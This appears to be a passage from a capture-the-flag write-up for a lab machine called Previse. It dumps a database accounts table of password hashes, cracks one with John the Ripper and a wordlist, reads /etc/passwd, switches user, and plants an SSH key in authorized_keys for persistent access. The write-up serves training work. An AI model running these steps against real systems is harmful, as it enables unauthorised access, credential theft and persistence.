# Database

Login to the database with the creds already discovered and we can "dump" the `accounts` table.

```bash
mysql> select * from accounts;
+----+------------+------------------------------------+---------------------+
| id | username   | password                           | created_at          |
+----+------------+------------------------------------+---------------------+
|  1 | m4lwhere   | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | testtest   | $1$🧂llol$mxh6P7CVsyxpyK7RtByIu1 | 2021-08-08 08:14:59 |
|  3 | Kesaya     | $1$🧂llol$7taMgxVoWkw0.jYJtl7Ec1 | 2021-08-08 13:04:24 |
|  4 | wowser     | $1$🧂llol$RuQME6AQOHLu1aYbqOZ/j1 | 2021-08-08 13:37:17 |
|  5 | meetlegend | $1$🧂llol$mtXe5PFEiC8JKd5j30vNC. | 2021-08-09 04:12:30 |
|  6 | admin      | $1$🧂llol$uXqzPW6SXUONt.AIOBqLy. | 2021-08-09 08:37:45 |
|  7 | c1sc0      | $1$🧂llol$EQRinCR0PEf1tUg5IfuVa/ | 2021-08-09 08:38:21 |
+----+------------+------------------------------------+---------------------+
7 rows in set (0.00 sec)
```

Oddly enough the salt string of the hash does have an actual salt emoji.
We know from the rev shell that the only user is `m4lwhere` on the box:

```bash
www-data@previse:/var/www/html$ cat /etc/passwd | grep -v "false\|nologin"
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
```

So it can be useful to maybe crack his password.

```bash
> john --format=md5crypt-long --wordlist=~/tools/pwlisten/rockyou/original.txt db-hash-m4lwhere.hash --fork=8
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster
Node numbers 1-8 of 8 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
[... snip ...]
ilovecody112235! (?)
[... snip ...]
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Using it in our session we can be user `m4lwhere` next:

```bash
www-data@previse:/var/www/html$ su - m4lwhere
Password: 
m4lwhere@previse:~$ cd
m4lwhere@previse:~$ ls -la
total 44
drwxr-xr-x 5 m4lwhere m4lwhere 4096 Aug  8 13:21 .
drwxr-xr-x 3 root     root     4096 May 25 14:59 ..
lrwxrwxrwx 1 root     root        9 Jun  6 13:04 .bash_history -> /dev/null
-rw-r--r-- 1 m4lwhere m4lwhere  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 m4lwhere m4lwhere 3771 Apr  4  2018 .bashrc
drwx------ 2 m4lwhere m4lwhere 4096 May 25 15:25 .cache
drwxr-x--- 3 m4lwhere m4lwhere 4096 Jun 12 10:09 .config
drwx------ 4 m4lwhere m4lwhere 4096 Jun 12 10:10 .gnupg
-rw-r--r-- 1 m4lwhere m4lwhere  807 Apr  4  2018 .profile
-rw-r--r-- 1 m4lwhere m4lwhere   75 May 31 19:19 .selected_editor
-r-------- 1 m4lwhere m4lwhere   33 Aug  8 08:14 user.txt
lrwxrwxrwx 1 root     root        9 Jul 28 09:10 .viminfo -> /dev/null
-rw-r--r-- 1 m4lwhere m4lwhere   75 Jun 18 01:18 .vimrc
m4lwhere@previse:~$ cat user.txt | wc -c
33
m4lwhere@previse:~$ 
```

# Upgrade shell to ssh
```bash
> ssh-keygen -f m4lwhere -t ed25519
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in m4lwhere
Your public key has been saved in m4lwhere.pub
The key fingerprint is:
SHA256:tvuHSnGMMNGl2OYBbxHjS7UGuJ10RZfc+emJMImxApY patrick@redkite
The key's randomart image is:
+--[ED25519 256]--+
|      +o=oooo..o.|
|     E.BoB.. .o..|
|    . =+Xo* .   o|
|      .OoO +   ..|
|        S o o o .|
|       . +   . o |
|        o  .     |
|       . .. .    |
|        oo..     |
+----[SHA256]-----+
> ls -la
.rw------- 411 patrick  9 Aug 11:23 m4lwhere
.rw-r--r--  97 patrick  9 Aug 11:23 m4lwhere.pub
> cat m4lwhere.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHbJhJ1HOInJ3K8Oen3mkYUpnUQctqHmp/0MniH8PWIG patrick@redkite
```

```bash
m4lwhere@previse:~$ mkdir .ssh
m4lwhere@previse:~$ cd .ssh
echo "...snip..." >> authorized_keys
m4lwhere@previse:~/.ssh$ ls -la
total 12
drwxrwxr-x 2 m4lwhere m4lwhere 4096 Aug  9 09:22 .
drwxr-xr-x 6 m4lwhere m4lwhere 4096 Aug  9 09:21 ..
-rw-rw-r-- 1 m4lwhere m4lwhere   81 Aug  9 09:22 authorized_keys
m4lwhere@previse:~/.ssh$ cat authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHbJhJ1HOInJ3K8Oen3mkYUpnUQctqHmp/0MniH8PWIG
m4lwhere@previse:~/.ssh$ 
```

```bash
> ssh -l m4lwhere -i m4lwhere 10.10.11.104
The authenticity of host '10.10.11.104 (10.10.11.104)' can't be established.
ED25519 key fingerprint is SHA256:BF5tg2bhcRrrCuaeVQXikjd8BCPxgLsnnwHlaBo3dPs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.104' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Aug  9 09:25:13 UTC 2021

  System load:  0.0               Processes:           204
  Usage of /:   55.4% of 4.85GB   Users logged in:     0
  Memory usage: 34%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Sun Aug  8 13:45:23 2021 from 10.10.14.18
m4lwhere@previse:~$ 
```